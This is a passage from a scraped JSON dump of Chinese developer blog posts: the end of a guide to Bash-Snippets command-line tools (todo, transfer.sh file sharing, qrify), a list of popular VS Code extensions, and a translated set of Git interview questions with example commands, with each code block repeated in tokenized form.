2018,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,todo, ,-,a, ,The ,second ,task,01,),., ,The ,first ,task ,Tue ,Jun, ,26, ,14,:,51,:,30, ,IST, ,2018,02,),., ,The ,second ,task ,Tue ,Jun, ,26, ,14,:,52,:,29, ,IST, ,2018,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,要查看任务列表，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ todo -g\r\n01). The first task Tue Jun 26 14:51:30 IST 2018\r\n02). A The second task Tue Jun 26 14:51:46 IST 2018,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,todo, ,-,g,01,),., ,The ,first ,task ,Tue ,Jun, ,26, ,14,:,51,:,30, ,IST, ,2018,02,),., ,A, ,The ,second ,task ,Tue ,Jun, ,26, ,14,:,51,:,46, ,IST, ,2018,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,一旦你完成了任务，就可以将其从列表中删除，如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ todo -r 2\r\nSucessfully removed task number 2\r\n01). The first task Tue Jun 26 14:51:30 IST 2018,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,todo, ,-,r, ,2,Sucessfully ,removed ,task ,number, ,2,01,),., ,The ,first ,task ,Tue ,Jun, ,26, ,14,:,51,:,30, ,IST, ,2018,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,要清除所有任务，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ todo -c\r\nTasks cleared.,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,todo, ,-,c,Tasks ,cleared,.,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,19、 Transfer,\n,Transfer 脚本允许你通过互联网快速轻松地传输文件和目录。,\n,让我们上传一个文件：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ transfer test.txt\r\nUploading test.txt\r\n################################################################################################################################################ 100.0%\r\nSuccess!\r\nTransfer Download Command: transfer -d desiredOutputDirectory ivmfj test.txt\r\nTransfer File URL: https://transfer.sh/ivmfj/test.txt,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,transfer ,test,.,txt,Uploading ,test,.,txt,################################################################################################################################################ 100.0%,Success,!,Transfer ,Download ,Command,:, ,transfer, ,-,d, ,desiredOutputDirectory ,ivmfj ,test,.,txt,Transfer ,File ,URL,:, ,https,:,//transfer.sh/ivmfj/test.txt,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,该文件将上传到 transfer.sh 站点。Transfer.sh 允许你一次上传最大 ,10 GB, 的文件。所有共享文件在 ,14 天,后自动过期。如你所见，任何人都可以通过 Web 浏览器访问 URL 或使用 transfer 目录来下载文件，当然，transfer 必须安装在他/她的系统中。,\n,现在从你的系统中移除文件。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ rm -fr test.txt,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,rm, ,-,fr ,test,.,txt,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在，你可以随时（14 天内）从 transfer.sh 站点下载该文件，如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ transfer -d Downloads ivmfj test.txt,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,transfer, ,-,d, ,Downloads ,ivmfj ,test,.,txt,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,获取关于此实用脚本的更多详情，参考以下指南。,\n,\n,用命令行在互联网上共享文件的一个简单快捷方法,\n,\n,获得帮助,\n,如果你不知道如何使用特定脚本，只需输入该脚本的名称，然后按下 ENTER 键，你将会看到使用细节。以下示例显示 Qrify 脚本的帮助信息。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ qrify\r\nQrify\r\nUsage: qrify [stringtoturnintoqrcode]\r\nDescription: Converts strings or urls into a qr code.\r\n -u Update Bash-Snippet Tools\r\n -m Enable multiline support (feature not working yet)\r\n -h Show the help\r\n -v Get the tool version\r\nExamples:\r\n qrify this is a test string\r\n qrify -m two\\\\nlines\r\n qrify github.com # notice no http:// or https:// this will fail\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,qrify,Qrify,Usage,:, ,qrify, ,[,stringtoturnintoqrcode,],Description,:, ,Converts ,strings ,or, ,urls ,into, ,a, ,qr ,code,., ,-,u, ,Update ,Bash,-,Snippet ,Tools, ,-,m, ,Enable ,multiline ,support, ,(,feature ,not, ,working ,yet,), ,-,h, ,Show ,the ,help, ,-,v, ,Get ,the ,tool ,version,Examples,:, ,qrify ,this, ,is, ,a, ,test ,string, ,qrify, ,-,m, ,two,\\,\\,nlines, ,qrify ,github,.,com, ,# notice no http:// or https:// this will fail, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,更新脚本,\n,你可以随时使用 ,-u, 选项更新已安装的工具。以下命令更新 “weather” 工具。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ weather -u,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,weather, ,-,u,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,卸载,\n,你可以使用以下命令来卸载这些工具。,\n,克隆仓库：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ git clone https://github.com/alexanderepstein/Bash-Snippets,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,git ,clone, ,https,:,//github.com/alexanderepstein/Bash-Snippets,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,进入 Bash-Snippets 目录：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cd Bash-Snippets,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cd ,Bash,-,Snippets,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,运行以下命令来卸载脚本：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo ./uninstall.sh,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo, ,.,/,uninstall,.,sh,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,输入 ,y,，并按下回车键来移除每个脚本。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nDo you wish to uninstall currency [Y/n]: y,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,Do, ,you ,wish ,to, ,uninstall ,currency, ,[,Y,/,n,],:, ,y,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,另请阅读：,\n,\n,Cli.Fyi —— 快速而简单地获取诸如 IP、电子邮件、域名等信息的方式,\n,\n,好了，这就是全部了。我必须承认，在测试这些脚本时我印象很深刻。我真的很喜欢将所有有用的脚本组合到一个包中的想法。感谢开发者。试一试，你不会失望的。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        , 1 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114303/", "url_object_id": "b15eb45c216616f8133bfbba6bdf6946", "front_image_path": "full/9cc891bb265e3188ae8c776551c233849ead64a5.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/ab5348ee803d45ffeb8d5cd807d2e478.jpg"], "title": "2018 年最受欢迎的 VS Code 扩展插件合集", "create_time": "2018/08/24", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,开源中国-达尔文,   ,\n,VS Code 是一个出色的代码编辑器，但真正使它强大的是它可用的扩展。 在这篇文章中，我分享了一些我最喜欢的 VS Code 扩展，同时使用 VS Code 开发 Web 应用程序。,\n,\n,WakaTime, – 根据编程活动自动生成度量标准，代码检测和时间跟踪。,\n,GitLens, – GitLens 增强了 Visual Studio Code 中内置的 Git 功能。例如 commits 搜索，历史记录和和查看代码作者身份，还能通过强大的比较命令获得有价值的见解等等。,\n,REST Client, – REST 客户端允许您直接发送 HTTP 请求并在 Visual Studio Code 中查看响应。,\n,Npm Intellisense, – Visual Studio Code 插件，用于在 import 语句中自动填充 npm 模块。,\n,Code Spell Checker, – 一个与 camelCase 代码配合使用的基本拼写检查程序。此拼写检查程序可以帮助捕获常见的拼写错误，同时保证减少误报的数量。,\n,Azure Storage, – Azure Storage 是微软 Azure 云提供的云端存储解决方案，当前支持的存储类型有 Blob、Queue、File 和 Table。按照,本教程,从 VS Code 部署 Web 应用程序到 Azure 存储。,\n,Night Owl, – 一个非常适合夜猫子的 VS Code 主题。像是为喜欢深夜编码的人精心设计的。,\n,Project Manager, – 它可以帮助您轻松访问项目。您可以利用它定义自己的收藏项目，或选择自动检测 VSCode 项目，Git，Mercurial 和 SVN 存储库。,\n,Todo Tree, – 此扩展可以快速搜索（使用 ripgrep）您的工作区以获取 TODO 和 FIXME 等注释标记，并在资源管理器窗格的树视图中显示。 单击树中的 TODO 将打开文件并将光标放在包含 TODO 的行上。,\n,Turbo Console Log, – 自动执行编写日志消息的操作，此扩展使调试更加容易。,\n,\n,你还知道哪些很酷的 VS Code 扩展插件？欢迎评论分享。,\n,英文作者：RICARDO,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114319/", "url_object_id": "508bbff9e4628435d712ed94cbc6fb66", "front_image_path": "full/6dd1f4992a88b242e6d018abbc6f249ffd81c9e4.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/02/2027c50856ddfe647e45b4ac2e86c9f1.jpg"], "title": "泪流满面的 11 个 Git 面试题", "create_time": "2018/08/22", "vote": "1", "bookmark": "18", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文由 ,伯乐在线, - ,BEASTQ, 翻译，,艾凌风, 校稿。未经许可，禁止转载！,英文出处：,Alex Ershov,。欢迎加入,翻译组,。,在今年的 Stack Overflow 开发者调查报告中，超过 70% 的开发者使用 Git，使其成为世界上使用人数最多的版本控制系统。Git 通常用于开源和商业软件开发，对个人、团队和企业都颇有益处。,\n,Q1: 什么是 Git 复刻（fork）？复刻（fork）、分支（branch）和克隆（clone）之间有什么区别？,\n,主题：,Git, 难度：⭐⭐,\n,\n,复刻（fork）, 是对存储仓库（repository）进行的远程的、服务器端的拷贝，从源头上就有所区别。复刻实际上不是 Git 的范畴。它更像是个政治/社会概念。,\n,克隆（clone）, 不是复刻，克隆是个对某个远程仓库的本地拷贝。克隆时，实际上是拷贝整个源存储仓库，包括所有历史记录和分支。,\n,分支（branch）, 是一种机制，用于处理单一存储仓库中的变更，并最终目的是用于与其他部分代码合并。,\n,\n,🔗,来源：, ,stackoverflow.com,\n, ,\n,Q2: “拉取请求（pull request）”和“分支（branch）”之间有什么区别？,\n,主题：,Git, 难度：⭐⭐,\n,\n,分支（branch）, 是代码的一个独立版本。,\n,拉取请求（pull request）, 是当有人用仓库，建立了自己的分支，做了些修改并合并到该分支（把自己修改应用到别人的代码仓库）。,\n,\n,🔗,来源：, ,stackoverflow.com,\n, ,\n,Q3: “git pull”和“git fetch”之间有什么区别？,\n,主题：,Git, 难度：⭐⭐,\n,简单来说，,git pull, 是 ,git fetch, + ,git merge,。,\n,\n,当你使用 ,pull,，Git 会试着自动为你完成工作。,它是上下文（工作环境）敏感的,，所以 Git 会把所有拉取的提交合并到你当前处理的分支中。,pull, 则是 ,自动合并提交而没有让你复查的过程,。如果你没有细心管理你的分支，你可能会频繁遇到冲突。,\n,当你 ,fetch,，Git 会收集目标分支中的所有不存在的提交，并,将这些提交存储到本地仓库中,。但,Git 不会把这些提交合并到当前分支中,。这种处理逻辑在当你需要保持仓库更新，在更新文件时又希望处理可能中断的事情时，这将非常实用。而将提交合并到主分支中，则该使用 ,merge,。,\n,\n,🔗,来源：, ,stackoverflow.com,\n, ,\n,Q4: 如在 Git 恢复先前的提交？,\n,主题：,Git, 难度：⭐⭐⭐,\n,假设你的情形是这样，其中 C 是你的 HEAD，(F) 是你文件的状态。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n   (F)\r\nA-B-C\r\n    ↑\r\n  master,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,   ,(,F,),A,-,B,-,C,    ,↑,  ,master,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,\n,要修改提交中的更改：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit reset --hard HEAD~1,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,reset, ,--,hard ,HEAD,~,1,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在 B 是 HEAD，因为你使用了 ,--hard,，所以你的文件将重置到提交 B 时的状态。,\n,\n,要撤销提交但保留更改：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit reset HEAD~1,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,reset ,HEAD,~,1,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在我们告诉 Git 将 HEAD 指针移回（后移）一个提交（B），并保留文件原样，然后你可以 ,git status, 来显示你已经检入 C 的更改。,\n,\n,撤销提交但保留文件和索引：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit reset --soft HEAD~1,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,reset, ,--,soft ,HEAD,~,1,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,执行此操作后，,git status,，你讲看到索引中的文件跟以前一致。,\n,🔗,来源：, ,stackoverflow.com,\n,\n,Q5: 什么是“git cherry-pick”？,\n,主题：,Git, 难度：⭐⭐⭐,\n,命令 ,git cherry-pick, 通常用于把特定提交从存储仓库的一个分支引入到其他分支中。常见的用途是从维护的分支到开发分支进行向前或回滚提交。,\n,这与其他操作（例如：合并（merge）、变基（rebase））形成鲜明对比，后者通常是把许多提交应用到其他分支中。,\n,小结：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit cherry-pick <commit-hash>,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,cherry,-,pick, ,<,commit,-,hash,>,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,🔗,来源：, ,stackoverflow.com,\n, ,\n,Q6: 解释 Forking 工作流程的优点,\n,主题：,Git, 难度：⭐⭐⭐,\n,Forking 工作流程 ,与其他流行的 Git 工作流程有着根本的区别。它不是用单个服务端仓库充当“中央”代码库，而是为每个开发者提供自己的服务端仓库。Forking 工作流程最常用于公共开源项目中。,\n,Forking 工作流程的,主要优点,是可以汇集提交贡献，又无需每个开发者提交到一个中央仓库中，从而实现干净的项目历史记录。开发者可以推送（push）代码到自己的服务端仓库，而只有项目维护人员才能直接推送（push）代码到官方仓库中。,\n,当开发者准备发布本地提交时，他们的提交会推送到自己的公共仓库中，而不是官方仓库。然后他们向主仓库提交请求拉取（pull request），这会告知项目维护人员有可以集成的更新。,\n,🔗,来源：, ,atlassian.com,\n, ,\n,Q7: 告诉我 Git 中 HEAD、工作树和索引之间的区别？,\n,主题：,Git, 难度：⭐⭐⭐,\n,\n,该,工作树/工作目录/工作空间,是你看到和编辑的（源）文件的目录树。,\n,该,索引/中转区（staging area）,是个在 ,/.git/index,，单一的、庞大的二进制文件，该文件列出了当前分支中所有文件的 SHA1 检验和、时间戳和文件名，它不是个带有文件副本的目录。,\n,HEAD,是当前检出分支的最后一次提交的引用/指针。,\n,\n,🔗,来源：, ,stackoverflow.com,\n, ,\n,Q8: 你能解释下 Gitflow 工作流程吗？,\n,主题：,Git, 难度：⭐⭐⭐,\n,Gitflow 工作流程使用两个并行的、,长期运行,的分支来记录项目的历史记录，分别是 ,master, 和 ,develop, 分支。,\n,\n,Master,，随时准备发布线上版本的分支，其所有内容都是经过全面测试和核准的（生产就绪）。\n,\n,Hotfix,，维护（maintenance）或修复（hotfix）分支是用于给快速给生产版本修复打补丁的。修复（hotfix）分支很像发布（release）分支和功能（feature）分支，除非它们是基于 ,master, 而不是 ,develop, 分支。,\n,\n,\n,Develop,，是合并所有功能（feature）分支，并执行所有测试的分支。只有当所有内容都经过彻底检查和修复后，才能合并到 ,master, 分支。\n,\n,Feature,，每个功能都应留在自己的分支中开发，可以推送到 ,develop, 分支作为功能（feature）分支的父分支。,\n,\n,\n,\n,\n,🔗,来源：, ,atlassian.com,\n, ,\n,Q9: 什么时候应使用 “git stash”？,\n,主题：,Git, 难度：⭐⭐⭐,\n,git stash, 命令把你未提交的修改（已暂存（staged）和未暂存的（unstaged））保存以供后续使用，以后就可以从工作副本中进行还原。,\n,回顾：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ git status\r\nOn branch master\r\nChanges to be committed:\r\nnew file: style.css\r\nChanges not staged for commit:\r\nmodified: index.html\r\n$ git stash\r\nSaved working directory and index state WIP on master: 5002d47 our new homepage\r\nHEAD is now at 5002d47 our new homepage\r\n$ git status\r\nOn branch master\r\nnothing to commit, working tree clean,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,git ,status,On ,branch ,master,Changes ,to, ,be ,committed,:,new, ,file,:, ,style,.,css,Changes ,not, ,staged ,for, ,commit,:,modified,:, ,index,.,html,$, ,git ,stash,Saved ,working ,directory ,and, ,index ,state ,WIP ,on ,master,:, ,5002d47, ,our ,new, ,homepage,HEAD ,is, ,now ,at, ,5002d47, ,our ,new, ,homepage,$, ,git ,status,On ,branch ,master,nothing ,to, ,commit,,, ,working ,tree ,clean,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我们可以使用暂存（stash）的一个地方是，如果我们发现在上次提交中忘记了某些内容，并且已经开始在同一分支中处理下一个提交了：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# Assume the latest commit was already done\r\n# start working on the next patch, and discovered I was missing something\r\n\r\n# stash away the current mess I made\r\n$ git stash save\r\n\r\n# some changes in the working dir\r\n\r\n# and now add them to the last commit:\r\n$ git add -u\r\n$ git commit --ammend\r\n\r\n# back to work!\r\n$ git stash pop,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# Assume the latest commit was already done,# start working on the next patch, and discovered I was missing something, ,# stash away the current mess I made,$, ,git ,stash ,save, ,# some changes in the working dir, ,# and now add them to the last commit:,$, ,git ,add, ,-,u,$, ,git ,commit, ,--,ammend, ,# back to work!,$, ,git ,stash ,pop,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,🔗,来源：, ,atlassian.com,\n, ,\n,Q10: 如何从 git 中删除文件，而不将其从文件系统中删除？,\n,主题：,Git, 难度：⭐⭐⭐⭐,\n,如果你在 ,git add, 过程中误操作，你最终会添加不想提交的文件。但是，,git rm, 则会把你的文件从你暂存区（索引）和文件系统（工作树）中删除，这可能不是你想要的。,\n,换成 ,git reset, 操作：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit reset filename          # or\r\necho filename >> .gitingore # add it to .gitignore to avoid re-adding it,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,reset ,filename,          ,# or,echo ,filename, ,>>, ,.,gitingore, ,# add it to .gitignore to avoid re-adding it,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上面意思是，,git reset <paths>, 是 ,git add <paths>, 的逆操作。,\n,🔗,来源：, ,codementor.io,\n, ,\n,Q11: 是么时候使用“git rebase”代替“git merge”？,\n,主题：,Git, 难度：⭐⭐⭐⭐⭐,\n,这两个命令都是把修改从一个分支集成到另一个分支上，它们只是以非常不同的方式进行。,\n,考虑一下场景，在合并和变基前：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nA <- B <- C    [master]\r\n^\r\n \\\r\n  D <- E       [branch],\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,A, ,<,-, ,B, ,<,-, ,C,    ,[,master,],^, ,\\,  ,D, ,<,-, ,E,       ,[,branch,],\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在 ,git merge master, 之后：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nA <- B <- C\r\n^         ^\r\n \\         \\\r\n  D <- E <- F,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,A, ,<,-, ,B, ,<,-, ,C,^,         ,^, ,\\,         ,\\,  ,D, ,<,-, ,E, ,<,-, ,F,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在 ,git rebase master, 之后：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nA <- B <- C <- D <- E,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,A, ,<,-, ,B, ,<,-, ,C, ,<,-, ,D, ,<,-, ,E,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,使用变基时，意味着使用另一个分支作为集成修改的新基础。,\n,何时使用：,\n,\n,如果你对修改不够果断，请使用合并操作。,\n,根据你希望的历史记录的样子，而选择使用变基或合并操作。,\n,\n,更多需要考虑的因素：,\n,\n,分支是否与团队外部的开发人员共享修改（如开源、公开项目）？,如果是这样，请不要使用变基操作。变基会破坏分支，除非他们使用 ,git pull --rebase,，否则这些开发人员将会得到损坏的或不一致的仓库。,\n,你的开发团队技术是否足够娴熟？,变基是一种破坏性操作。这意味着，如果你没有正确使用它，你可能会丢失提交，并且/或者会破坏其他开发者仓库的一致性。,\n,分支本身是否代表有用的信息？,一些团队使用,功能分支（branch-per-feature）,模式，每个分支代表一个功能（或错误修复，或子功能等）。在此模式中，分支有助于识别相关提交的集合。在每个,开发人员分支（branch-per-developer）,模式中，分支本身不会传达任何其他信息（提交信息已有作者）。则在这种模式下，变基不会有任何破坏。,\n,是否无论如何都要还原合并？,恢复（如在撤销中）变基，是相当困难的，并且/或者在变基中存在冲突时，是不可能完成的。如果你考虑到日后可能需要恢复，请使用合并操作。,\n,\n,🔗,来源：, ,stackoverflow.com,\n\r\n        \r\n            ,\n        ,打赏支持我翻译更多好文章，谢谢！,\n        , 打赏译者,\n    ,\n\n    ,\n        ,打赏支持我翻译更多好文章，谢谢！,\n                ,任选一种支付方式,\n                ,\n                        ,\n            \n                            ,\n                    ,\n    ,\n\n    \r\n        \n    ,\n        , ,1, 赞,\n        , 18 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,BEASTQ,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            iOS pogo        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 10, · , ,         ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114297/", "url_object_id": "e6ce4e99749917a7a76fde2a39112a9c", "front_image_path": "full/b7572ca0b31306f69135c34a75fb5c67782dfb3a.jpg"},{"front_image_url": 